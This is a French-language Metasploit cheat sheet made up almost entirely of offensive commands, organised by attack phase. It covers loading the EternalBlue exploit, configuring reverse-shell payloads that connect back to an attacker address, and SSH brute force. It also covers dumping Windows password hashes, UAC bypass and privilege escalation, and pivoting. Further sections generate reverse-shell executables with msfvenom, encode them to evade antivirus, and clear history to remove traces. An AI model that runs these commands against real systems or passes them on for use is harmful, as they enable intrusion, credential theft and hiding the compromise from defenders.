⚡ Metasploit Framework – Cheatsheet Cybersécurité

Cette cheatsheet regroupe les commandes essentielles pour utiliser, configurer, rechercher, exploiter, post-exploiter, et gérer des sessions avec Metasploit.

🚀 1. Lancement & Interface

msfconsole

Lance Metasploit Framework en mode console

msfupdate

Met à jour les modules Metasploit

🔍 2. Recherche de modules (scanner, exploit, payload…)

search windows smb

Recherche tous les modules relatifs au SMB Windows

search type:exploit name:ftp

Recherche d’exploits spécifiques (par type et nom)

search cve:2020-0796

Recherche par CVE

📦 3. Utilisation d’un module

use exploit/windows/smb/ms17_010_eternalblue

Charge un module exploit dans la console

show options

Affiche les options du module sélectionné

show payloads

Liste les payloads compatibles

set RHOSTS <IP>

Définit la cible

set RPORT 445

Définit le port cible

set PAYLOAD windows/x64/meterpreter/reverse_tcp

Sélectionne un payload Meterpreter

run

Exécute le module

exploit

Equivalent à run (lance l’exploit)

🔧 4. Payloads les plus courants

set PAYLOAD windows/meterpreter/reverse_tcp

Reverse shell Meterpreter classique

set PAYLOAD linux/x86/shell_reverse_tcp

Reverse shell Linux

set PAYLOAD cmd/unix/reverse_perl

Shell Perl (utile en contournement)

set LHOST <attacker_ip>

Adresse IP de l’attaquant

set LPORT 4444

Port d’écoute pour le shell

📡 5. Listener & Handler

use exploit/multi/handler

Handler multi-plateforme pour réceptionner un reverse shell

set PAYLOAD windows/meterpreter/reverse_tcp

Définit le payload attendu

run

Attente de connexion entrante (listener actif)

🛠 6. Modules auxiliaires (scan, enum, brute…)

use auxiliary/scanner/portscan/tcp

Scan TCP des ports via Metasploit

use auxiliary/scanner/smb/smb_version

Détecte la version SMB d’une cible

use auxiliary/scanner/http/http_version

Récupère la version du serveur HTTP

use auxiliary/scanner/ssh/ssh_login

Bruteforce SSH intégré

set USER_FILE users.txt

Indique la liste des utilisateurs

set PASS_FILE rockyou.txt

Indique la liste des mots de passe

🐚 7. Sessions Meterpreter

sessions

Affiche les sessions actives

sessions -i <ID>

Interagit avec une session Meterpreter

background

Met la session Meterpreter en arrière-plan

sysinfo

Informations système de la machine compromise

getuid

Affiche l’utilisateur actuel

upload file.txt C:\Users\Public\

Upload d’un fichier

download secret.txt

Téléchargement d’un fichier

shell

Ouvre un shell système via Meterpreter

🔥 8. Post-Exploitation (Windows & Linux)

use post/windows/gather/hashdump

Dump des hashs Windows locaux

use post/windows/manage/enable_rdp

Active RDP sur la machine compromise

use post/multi/manage/shell_to_meterpreter

Convertit un shell simple en session Meterpreter

use exploit/windows/local/bypassuac

Tentative d’élévation via bypass UAC

use post/linux/gather/enum_users_history

Récupération des fichiers bash_history & users Linux

🧰 9. Elevation de Privilèges

use post/multi/recon/local_exploit_suggester

Analyse la machine et propose les exploits compatibles

run

Lance la suggestion automatique

meterpreter > getsystem

Tentative rapide d’élévation en Windows

📡 10. Pivoting & Tunneling

use post/multi/manage/autoroute

Ajout automatique de route via session compromise

run autoroute -s 10.10.10.0/24

Route un sous-réseau à travers la session

use auxiliary/server/socks_proxy

Active un proxy SOCKS5 pour faire du pivot

set SRVPORT 1080

Définit le port du proxy

🛡 11. Génération de payloads (msfvenom)

msfvenom -l payloads

Liste tous les payloads disponibles

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe

Génère un reverse shell Windows .exe

msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf

Génère un reverse shell Linux .elf

msfvenom -p windows/meterpreter/reverse_https -f raw

Génération de payload HTTPS (plus discret)

🔥 12. Evading AV (Basiques)

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe > bypass.exe

Encodage simple pour contourner certains antivirus

msfvenom -p windows/meterpreter/reverse_https -f exe -o stealth.exe

Reverse HTTPS → plus difficile à détecter

🧹 13. Nettoyage

sessions -K

Ferme toutes les sessions

jobs -K

Stoppe tous les jobs en arrière-plan

rm /tmp/shell.elf

Suppression manuelle des payloads

history -c

Nettoyage historique Metasploit

📚 14. Ressources utiles

Metasploit Unleashed (OffSec)

Documentation complète

Rapid7 Docs

Modules, payloads et updates

PayloadsAllTheThings – Metasploit

Payloads et techniques courantes

HackTricks – Metasploit

Exploits, pivoting, conseils
